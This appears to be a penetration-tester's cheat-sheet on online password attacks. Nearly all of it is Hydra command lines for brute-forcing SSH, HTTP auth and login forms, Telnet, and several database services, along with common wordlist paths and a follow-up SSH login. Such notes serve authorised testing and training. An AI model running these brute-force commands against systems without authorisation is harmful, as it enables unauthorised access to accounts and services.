---
title: Online Password Attacks
type: note
tab: Initial Access
inputs: [Username]
outputs: [Password]
tags: [InitialAccess, Password, HTTP, SSH]
---

# Online Password Attacks

## Hydra

#Username #SSH #InitialAccess
Brute-force SSH on a nonstandard port, then log in with the recovered password.

```sh
hydra -l <USER> -P <WORDLIST> -s <PORT> ssh://<TARGET_IP>
ssh <USER>@<TARGET_IP> -p <PORT>
```

#Username #HTTP #InitialAccess
Brute-force an HTTP GET-auth endpoint with Hydra.

```sh
hydra -l <USER> -P <WORDLIST> <TARGET_IP> http-get /
```

#Username #HTTP #InitialAccess
Brute-force a web login form with Hydra's `http-post-form` module.

```sh
hydra -l <USER> -P <WORDLIST> <TARGET_IP> http-post-form "/index.php:fm_usr=^USER^&fm_pwd=^PASS^:Login failed. Invalid"
```

## Hydra Services

### SSH

#Username #SSH #InitialAccess
Brute-force SSH with common Hydra options and a custom wordlist.

```sh
hydra <TARGET_IP> ssh -l <USER> -P <WORDLIST> -s 22 -vv
hydra <TARGET_IP> ssh -l root -P password.txt -t 1 -v
```

Useful small SSH wordlist:

```text
/usr/share/wordlists/SecLists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt
```

### Telnet

#Username #InitialAccess
Brute-force Telnet with a username and RockYou.

```sh
hydra <TARGET_IP> telnet -l <USER> -P /usr/share/wordlists/rockyou.txt -v
```

### Databases

#Username #InitialAccess
Brute-force common database services with Hydra.

```sh
# MySQL
hydra -l <USER> -P <WORDLIST> -f -s <PORT> mysql://<TARGET_IP>

# Oracle listener
hydra -L users.txt -P passwords.txt <TARGET_IP> oracle-listener

# MongoDB
hydra -l admin -P passwords.txt <TARGET_IP> mongodb

# PostgreSQL
hydra -l postgres -P passwords.txt <TARGET_IP> postgres
```

## Notes

- Adjust the failure string and form parameter names to match the real application response.
- Check lockout policy before online guessing.
